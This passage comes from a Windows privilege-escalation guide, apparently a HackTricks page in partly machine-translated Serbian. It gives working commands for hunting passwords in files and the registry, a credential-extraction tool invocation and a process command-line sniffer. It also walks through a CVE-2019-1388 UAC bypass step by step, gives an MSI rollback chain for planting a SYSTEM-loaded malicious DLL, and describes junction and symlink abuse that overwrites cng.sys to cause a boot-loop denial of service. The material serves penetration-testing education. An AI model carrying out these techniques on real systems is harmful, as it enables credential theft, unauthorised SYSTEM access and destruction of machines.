COM klase i interfejsi su definisani u registru pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface** respektivno. Ovaj registry je kreiran spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

U suštini, ako možete **overwrite any of the DLLs** koje će biti izvršene, mogli biste **escalate privileges** ako će ta DLL biti izvršena od strane drugog korisnika.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Pretražite sadržaj fajlova**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Pretraži fajl sa određenim imenom**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pretražite registar za imena ključeva i lozinke**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Alati koji pretražuju lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin. Napravio sam ovaj plugin da **automatski izvršava sve metasploit POST module koji traže credentials** unutar žrtve.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve fajlove koji sadrže lozinke pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za ekstrakciju lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) pretražuje **sessions**, **usernames** i **passwords** nekoliko alata koji čuvaju ove podatke u clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Zamislite da **proces koji se izvršava kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **puno privilegija**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali nasleđuje sve otvorene handle-ove glavnog procesa**.\
Ako imate **puni pristup procesu sa niskim privilegijama**, možete preuzeti **otvoreni handle ka privilegovanom procesu kreiranom** sa `OpenProcess()` i **ubrizgati shellcode**.\
[Pročitajte ovaj primer za više informacija o **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte ovaj **drugi post za potpunije objašnjenje kako testirati i zloupotrebiti više otvorenih handle-ova procesa i thread-ova nasleđenih sa različitim nivoima dozvola (ne samo full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, nazvani **pipes**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows pruža funkcionalnost pod nazivom **Named Pipes**, koja omogućava da nepovezani procesi razmenjuju podatke, čak i preko različitih mreža. Ovo podseća na client/server arhitekturu, gde su uloge definisane kao **named pipe server** i **named pipe client**.

Kada klijent pošalje podatke kroz pipe, **server** koji je kreirao pipe može da **preuzme identitet** klijenta, pod uslovom da ima neophodna prava **SeImpersonate**. Pronalaženje **privilegovanog procesa** koji komunicira putem pipe-a koji možete oponašati pruža priliku da **dobijete više privilegija** preuzimanjem identiteta tog procesa kada on komunicira sa pipe-om koji ste vi uspostavili. Za uputstva za izvođenje takvog napada, korisni vodiči su dostupni [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava da **presretnete named pipe komunikaciju alatima kao što je burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava da izlistate i vidite sve pipe-ove kako biste pronašli privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Ostalo

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Praćenje komandnih linija radi lozinki**

Kada dobijete shell kao korisnik, mogu postojati scheduled tasks ili drugi procesi koji se izvršavaju i koji **prosleđuju kredencijale preko komandne linije**. Skripta ispod hvata komandne linije procesa na svake dve sekunde i poredi trenutni status sa prethodnim, ispisujući sve razlike.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Krađa lozinki iz procesa

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko console ili RDP) i UAC je omogućen, u nekim verzijama Microsoft Windows moguće je pokrenuti terminal ili bilo koji drugi proces kao "NT\AUTHORITY SYSTEM" iz naloga bez privilegija.

Ovo omogućava eskalaciju privilegija i istovremeno zaobilaženje UAC-a pomoću iste ranjivosti. Dodatno, nije potrebno ništa instalirati, a binarni fajl koji se koristi tokom procesa je potpisan i izdat od strane Microsoft-a.

Neki od pogođenih sistema su sledeći:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Da biste exploit this vulnerability, potrebno je izvršiti sledeće korake:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Tehnika opisana u [**ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) sa exploit code-om [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Napad se zasniva na zloupotrebi rollback funkcije Windows Installer-a da zameni legitimne fajlove malicioznim tokom procesa deinstalacije. Za ovo napadač treba da kreira **malicious MSI installer** koji će biti iskorišćen da hijack-uje `C:\Config.Msi` folder, koji će kasnije Windows Installer koristiti za čuvanje rollback fajlova tokom deinstalacije drugih MSI paketa, gde bi rollback fajlovi bili izmenjeni da sadrže maliciozni payload.

Sumirana tehnika je sledeća:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete obrisati **ceo folder** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost dozvoljava samo **arbitrary file deletion**? Možete iskoristiti **NTFS internals**: svaki folder ima skriveni alternate data stream koji se zove:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ovaj stream čuva **indeksne metapodatke** direktorijuma.

Dakle, ako **obrišete `::$INDEX_ALLOCATION` stream** direktorijuma, NTFS **uklanja ceo direktorijum** iz fajl-sistema.

Možete to uraditi koristeći standardne API-je za brisanje fajlova, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Iako pozivate *file* delete API, ono **briše sam folder**.

### From Folder Contents Delete to SYSTEM EoP
Šta ako vaš primitive ne dozvoljava brisanje proizvoljnih files/folders, ali ono **dozvoljava brisanje *contents* attacker-controlled folder**?

1. Step 1: Postavite mamac folder i file
- Kreirajte: `C:\temp\folder1`
- Unutar njega: `C:\temp\folder1\file1.txt`

2. Step 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršenje** kada privilegovani proces pokuša da obriše `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Korak 3: Pokrenite SYSTEM proces (npr. `SilentCleanup`)
- Ovaj proces skenira foldere (npr. `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada dođe do `file1.txt`, **oplock se okida** i predaje kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
- Ovo prazni `folder1` bez prekida oplock-a.
- Nemojte direktno obrisati `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcija C: Napravite **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Ovo cilja NTFS interni stream koji čuva metapodatke foldera — njegovo brisanje briše folder.

5. Korak 5: Oslobodite oplock
- Proces SYSTEM nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` briše SYSTEM.

### Od Arbitrary Folder Create do trajnog DoS

Iskoristite primitiv koji vam omogućava da **kreirate proizvoljan folder kao SYSTEM/admin** — čak i ako **ne možete pisati fajlove** ili **postaviti slabe dozvole**.

Kreirajte **folder** (ne fajl) sa imenom **kritičnog Windows drivera**, npr.:
```
C:\Windows\System32\cng.sys
```
- Ova putanja obično odgovara kernel-mode driveru `cng.sys`.
- Ako je **pre-kreirate kao folder**, Windows ne uspeva da učita stvarni driver pri podizanju sistema.
- Zatim, Windows pokušava da učita `cng.sys` tokom boot-a.
- Vidi folder, **ne uspeva da razreši stvarni driver**, i **sistem se sruši ili zaustavi podizanje**.
- Nema **rezervnog mehanizma**, i **nema oporavka** bez spoljne intervencije (npr. boot repair ili pristup disku).

### Iz privilegovanih log/backup putanja + OM symlinks do proizvoljnog prepisivanja fajla / boot DoS

Kada **privilegovana usluga** upisuje logove/eksporte u putanju koja se čita iz **konfiguracije koja je upisiva**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste pretvorili privilegovani upis u proizvoljno prepisivanje (čak i **bez** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Konfiguracija koja čuva ciljnu putanju je upisiva od strane napadača (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Privilegovana operacija koja piše u tu putanju (log, export, report).

**Example chain**
1. Pročitaj konfiguraciju da bi povratio privilegovanu destinaciju loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmeri putanju bez admina:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta zapiše log (npr. administrator pokreće "send test SMS"). Zapis sada dospeva u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisani cilj (hex/PE parser) da potvrdite korupciju; ponovno pokretanje primorava Windows da učita izmenjeni put drajvera → **boot loop DoS**. Ovo se takođe generalizuje na bilo koji zaštićeni fajl koji će privilegovana usluga otvoriti za upis.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys` može se pokušati prva, što ga čini pouzdanim DoS ciljem za korumpirane podatke.



## **Od High Integrity do SYSTEM**

### **Nova usluga**

Ako već radite u High Integrity procesu, **put do SYSTEM** može biti jednostavan samo **kreiranjem i izvršavanjem nove usluge**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Kada kreirate service binary uverite se da je validan service ili da binarni fajl izvršava neophodne akcije dovoljno brzo, jer će biti ugašen za 20s ako nije validan service.

### AlwaysInstallElevated

Iz High Integrity procesa možete pokušati da **omogućite AlwaysInstallElevated registry unose** i **instalirate** reverse shell koristeći _**.msi**_ wrapper.\
[Više informacija o registry ključevima koji su uključeni i kako instalirati _.msi_ paket ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Možete** [**pronaći kod ovde**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ako imate te token privilegije (verovatno ćete ih naći u već postojećem High Integrity procesu), bićete u mogućnosti da **otvorite skoro bilo koji process** (ne zaštićene procese) sa SeDebug privilegijom, **kopirate token** procesa i kreirate **arbitrary process sa tim tokenom**.\
Korišćenjem ove tehnike obično se bira bilo koji proces koji se pokreće kao SYSTEM sa svim token privilegijama (_da, možete naći SYSTEM procese bez svih token privilegija_).\
**Možete naći** [**primer koda koji izvršava predloženu tehniku ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ova tehnika je korišćena od strane meterpreter-a za eskalaciju u `getsystem`. Tehnika se sastoji od **kreiranja pipe-a i potom kreiranja/abuzovanja servisa koji piše u taj pipe**. Zatim, **server** koji je kreirao pipe koristeći **`SeImpersonate`** privilegiju biće u mogućnosti da **impersonira token** pipe klijenta (servisa) i tako dobije SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite primer [**kako preći iz high integrity u System koristeći name pipes pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijack-ujete dll** koji se **učitava** od strane **process** koji se pokreće kao **SYSTEM**, moći ćete da izvršite arbitrary code sa tim permisijama. Dakle, Dll Hijacking je takođe koristan za ovu vrstu eskalacije privilegija i, što je još važnije, mnogo je **lakše postići iz high integrity procesa** jer će imati **write permissions** na folderima koji se koriste za učitavanje dll-ova.\
**Možete** [**saznati više o Dll hijacking ovde**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Najbolji alat za pronalaženje Windows lokalnih vektora za eskalaciju privilegija:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava za pogrešne konfiguracije i osetljive fajlove (**[**proveri ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovano.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava moguća pogrešna podešavanja i prikuplja informacije (**[**proveri ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava za pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači sačuvane sesije za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači kredencijale iz Credential Manager-a. Detektovano.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Primeni prikupljene lozinke po domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS spoofer i man-in-the-middle alat.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Pretražuje poznate privesc ranjivosti (ZASTARELO za Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Pretražuje poznate privesc ranjivosti (mora se kompajlirati koristeći VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host tražeći pogrešne konfiguracije (više alat za prikupljanje informacija nego za privesc) (mora se kompajlirati) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači kredencijale iz mnogih softvera (prekompajlirani exe na GitHub-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava za pogrešne konfiguracije (prekompajlirani izvršni fajl na GitHub-u). Ne preporučuje se. Ne radi dobro na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz python-a). Ne preporučuje se. Ne radi dobro na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat kreiran na osnovu ovog posta (ne treba accesschk da bi radio ispravno, ali ga može koristiti).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz **systeminfo** i preporučuje radne exploite (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz **systeminfo** i preporučuje radne exploite (lokalni python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Morate kompajlirati projekat koristeći odgovarajuću verziju .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na žrtvinom hostu možete uraditi:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Literatura

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
